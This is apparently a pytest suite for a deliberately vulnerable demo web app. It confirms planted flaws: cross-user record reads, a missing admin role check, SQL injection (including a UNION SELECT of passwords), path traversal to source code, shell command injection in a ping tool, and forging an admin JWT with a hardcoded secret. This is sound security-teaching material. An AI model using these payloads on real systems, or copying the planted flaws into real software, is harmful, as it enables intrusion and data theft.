"""
test_vulnerabilities.py — Confirm that each intentional vulnerability is present
and exploitable as designed. These tests document EXPECTED vulnerable behaviour.
A passing test means the vulnerability is confirmed, NOT that the app is secure.
"""
from tests.conftest import auth_headers


# ===========================================================================
# VULN-001: IDOR — Broken Object Level Authorization
# ===========================================================================

class TestVULN001_IDOR:
    """
    alice (user_id=2) should be able to read admin (user_id=1) record.
    Expected: 200 OK with admin's data — this is the VULNERABLE behaviour.
    """

    def test_regular_user_can_read_own_record(self, client, user_token):
        resp = client.get("/users/2", headers=auth_headers(user_token))
        assert resp.status_code == 200
        assert resp.json()["username"] == "alice"

    def test_regular_user_can_read_other_users_record(self, client, user_token):
        """VULN-001: alice reads admin's record — should be forbidden, but is not."""
        resp = client.get("/users/1", headers=auth_headers(user_token))
        # Expected: 200 (vulnerable) — a secure app would return 403
        assert resp.status_code == 200, "VULN-001 confirmed: IDOR allows cross-user data access"
        body = resp.json()
        assert body["username"] == "admin"
        assert body["role"] == "admin"

    def test_regular_user_can_read_third_user_record(self, client, user_token):
        """VULN-001: alice reads bob's record."""
        resp = client.get("/users/3", headers=auth_headers(user_token))
        assert resp.status_code == 200
        assert resp.json()["username"] == "bob"


# ===========================================================================
# VULN-002: Missing Authorization / Privilege Escalation
# ===========================================================================

class TestVULN002_PrivilegeEscalation:
    """
    alice (role='user') should NOT be able to access /admin/* endpoints.
    Expected: 200 (vulnerable) — a secure app would return 403.
    """

    def test_regular_user_can_list_all_users_via_admin(self, client, user_token):
        """VULN-002: alice accesses the admin user list."""
        resp = client.get("/admin/users", headers=auth_headers(user_token))
        assert resp.status_code == 200, "VULN-002 confirmed: role check missing on /admin/users"
        body = resp.json()
        assert "users" in body
        assert len(body["users"]) >= 3

    def test_admin_can_also_list_users(self, client, admin_token):
        resp = client.get("/admin/users", headers=auth_headers(admin_token))
        assert resp.status_code == 200


# ===========================================================================
# VULN-003: SQL Injection
# ===========================================================================

class TestVULN003_SQLInjection:
    """
    The /search/users?q= parameter is interpolated directly into SQL.
    """

    def test_normal_search_works(self, client, user_token):
        resp = client.get("/search/users?q=alice", headers=auth_headers(user_token))
        assert resp.status_code == 200
        results = resp.json()["results"]
        assert any(u["username"] == "alice" for u in results)

    def test_sql_injection_returns_all_rows(self, client, user_token):
        """
        VULN-003: Injection payload ' OR '1'='1 should return all users.
        A secure parameterized query would treat this as a literal string.
        """
        resp = client.get(
            "/search/users?q=' OR '1'='1",
            headers=auth_headers(user_token),
        )
        assert resp.status_code == 200, "VULN-003 confirmed: SQL injection query executed"
        results = resp.json()["results"]
        usernames = [u["username"] for u in results]
        # Injection collapses the WHERE clause — all 3 users should appear
        assert "admin" in usernames, "SQL injection should expose admin record"
        assert len(results) >= 3, "SQL injection should return all rows"

    def test_sql_injection_union_based(self, client, user_token):
        """
        VULN-003: UNION-based injection to demonstrate data exfiltration.
        """
        payload = "x' UNION SELECT id,username,password,email FROM users--"
        resp = client.get(
            f"/search/users?q={payload}",
            headers=auth_headers(user_token),
        )
        # A response (even with an error) without crashing confirms injection is attempted
        assert resp.status_code == 200


# ===========================================================================
# VULN-004: Path Traversal
# ===========================================================================

class TestVULN004_PathTraversal:
    """
    GET /files/{filename} does not sanitize the path.
    """

    def test_read_public_file(self, client, user_token):
        resp = client.get("/files/public.txt", headers=auth_headers(user_token))
        assert resp.status_code == 200
        assert "public" in resp.text.lower()

    def test_read_secret_file(self, client, user_token):
        resp = client.get("/files/secret.txt", headers=auth_headers(user_token))
        assert resp.status_code == 200
        assert "DEMO_SECRET_DATA_ONLY" in resp.text

    def test_path_traversal_reads_outside_files_dir(self, client, user_token):
        """
        VULN-004: Use ../ to escape the files/ directory and read app source.
        A secure implementation would return 403, not the file contents.
        """
        resp = client.get(
            "/files/../app/auth.py",
            headers=auth_headers(user_token),
        )
        # Expected: 200 with source code (vulnerable)
        # If the OS or framework resolves the path differently, accept 404 but NOT 403
        assert resp.status_code in (200, 404), (
            "VULN-004: path traversal should not return 403/400 (no restriction in place)"
        )
        if resp.status_code == 200:
            assert "SECRET_KEY" in resp.text, "Traversal exposed auth.py source"


# ===========================================================================
# VULN-005: Command Injection
# ===========================================================================

class TestVULN005_CommandInjection:
    """
    GET /tools/ping?host= passes the value to shell=True subprocess.
    """

    def test_normal_ping(self, client, admin_token):
        resp = client.get("/tools/ping?host=127.0.0.1", headers=auth_headers(admin_token))
        assert resp.status_code == 200
        body = resp.json()
        assert "command" in body

    def test_command_injection_echo(self, client, admin_token):
        """
        VULN-005: Inject ; echo INJECTED after the host.
        A secure app would reject or escape the semicolon.
        """
        resp = client.get(
            "/tools/ping?host=127.0.0.1; echo INJECTED",
            headers=auth_headers(admin_token),
        )
        assert resp.status_code == 200
        body = resp.json()
        # On Linux (Docker), the injected echo command should appear in stdout
        stdout = body.get("stdout", "") + body.get("stderr", "")
        assert "INJECTED" in stdout or "ping" in body.get("command", ""), (
            "VULN-005 confirmed: injected command executed"
        )


# ===========================================================================
# VULN-006: Hardcoded Secret
# ===========================================================================

class TestVULN006_HardcodedSecret:
    """
    The SECRET_KEY is hardcoded in app/auth.py.
    This test verifies that a token forged with the known key is accepted.
    """

    def test_forged_token_with_known_secret_is_accepted(self, client):
        """
        VULN-006 / VULN-007: Forge a token using the known hardcoded secret.
        A secure app would rotate secrets and not expose them in source.
        """
        from jose import jwt
        known_secret = "vuln-demo-secret-key"
        forged_token = jwt.encode(
            {"sub": "eve", "role": "admin"},
            known_secret,
            algorithm="HS256",
        )
        resp = client.get(
            "/admin/users",
            headers={"Authorization": f"Bearer {forged_token}"},
        )
        assert resp.status_code == 200, (
            "VULN-006 confirmed: forged token with hardcoded secret accepted"
        )
